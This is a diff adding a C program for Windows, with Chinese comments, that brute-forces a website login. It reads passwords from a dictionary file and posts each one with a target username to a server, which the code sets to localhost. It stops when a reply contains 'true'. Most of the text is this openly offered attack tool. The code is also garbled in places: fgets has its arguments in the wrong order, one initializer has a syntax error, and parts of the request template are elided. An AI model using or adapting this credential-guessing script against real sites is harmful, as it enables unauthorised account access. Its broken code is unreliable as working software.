@@ -1,0 +1,132 @@
+#include<Winsock2.h>
+#include<windows.h>
+#include<stdio.h>
+#include<string.h>
+/*
+	网站密码暴力破解
+	****************************
+	DLL函数的加载和调用
+		DLL库加载函数：HMODULE LoadLibrary(LPCTSTR lpFileName);
+		参数：DLL文件的路径
+		返回值：模块句柄
+		
+		获取模块地址：FARPROC GetProcAddress(HMODULE hModule,LPCSTR lpProcName);
+		参数：模块，函数名
+		返回值：得到的地址
+		
+		用例：
+			加载：
+			HINSTANCE hmod=LoadLibrary(".\\base64.dll");
+			PROC tobase64Proc=GetProcAddress(hmmod,"tobase64");
+			
+			调用：参数入栈根据参数列表，这种方式避免了额外的函数声明：extern void tobase64(char * srcStrArr,char * drtStrArr);
+			__asm
+			{
+				push 1
+				push srcStrArr
+				push drtStrArr
+				call tobase64Proc
+			}
+*/
+int main()
+{
+	WSADATA wsaData;
+	WSAStartup(MAKEWORD(2,2),&wsaData);
+	
+	//Http是基于TCP的网络协议，因此使用TCP模拟登陆
+	SOCKET targetSock=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);
+	
+	//填写目标服务器的地址信息
+	struct sockaddr_in targetAddr;
+	targetAddr.sin_family=PF_INET;
+	targetAddr.sin_addr.S_un.S_addr=inet_addr("127.0.0.1");
+	targetAddr.sin_port=htons(8001);
+	
+	//连接服务器
+	connect(targetSock,(SOCKADDR *)&targetAddr,sizeof(targetAddr));
+	
+	//输入破解的账号
+	char userName[MAXBYTE]={0};
+	printf("请输入目标账号：\n");
+	scanf("%s",userName);
+	
+	//由于密码爆破密码可能组合很多，因此一般从文件（字典）获取一个密码进行试探
+	char dictFileName[MAX_PATH]={0};
+	GetCurrentDirectory(MAX_PATH,dictFileName);//获取程序所在路径
+	strcat(dictFileName,"\\dict.txt");
+	FILE * fp=fopen(dictFileName,"r");
+	if(fp==NULL)
+	{
+		printf("字典文件：dict.txt找不到！！\n");
+		return 0;
+	}
+	
+	//用户密码
+	char userPwd[MAXBYTE]={0};
+	
+	//请求包和回馈包通过网络抓包获取分析即可
+	//模仿的一次请求包准备内容，包内容和固定包长度
+	char requestPackage[]={"POST ***\r\n\
+							Host 127.0.0.1\r\n\
+							***\
+							content-lenght:%d\
+							***\
+							<m:userName\r\n\
+								s:type=\"y:string\">%s</m:userName>\
+							<m:userPwd\r\n\
+								s:type=\"y:string\">%s</m:userPwd>\
+							***"};//模拟一次请求的包内容，其中的%d用来填入包的大小%s用来填入用户名和密码
+	const int packageOtherLength=500;
+	
+	//最大试探次数
+	const int maxTestTimes=300;
+	//当前试探次数
+	int currentTestTimes=0;
+	DWORD startTime=GetTickCount();
+	while(!feof(fp))
+	{
+		if(currentTestTimes>=maxTestTimes)
+		{
+			printf("已达到最大试探次数，破解失败！！");
+			break;
+		}
+		
+		//获取一个试探密码
+		fgets(fp,20,userPwd);
+		
+		//构造包内容串
+		CString reqPack;
+		reqPack.Format(requestPackage,packageOtherLength+strlen(userName)+strlen(userPwd),userName,userPwd);
+		
+		//发送请求包
+		send(targetSock,reqPack.GetBuffer(0),reqPack.GetLength(),0);
+		
+		//接受反馈包
+		char receivePackage[1024]={0);
+		recv(targetSock,receivePackage,1024,0);
+		
+		//查找是否成功的标记
+		CString recvPack=receivePackage;
+		int ret=recvPack.Find("true",0);
+		if(ret!=-1)
+		{
+			printf("密码破解成功！！:%s\n",userPwd);
+			break;
+		}
+		
+		currentTestTimes++;
+	}
+	
+	DWORD endTime=GetTickCount();
+	
+	printf("耗时：%ldms\n",endTime-startTime);
+	
+	fclose(fp);
+	
+	closesocket(targetSock);
+	
+	WSACleanup();
+	
+	system("pause");
+	return 0;
+}
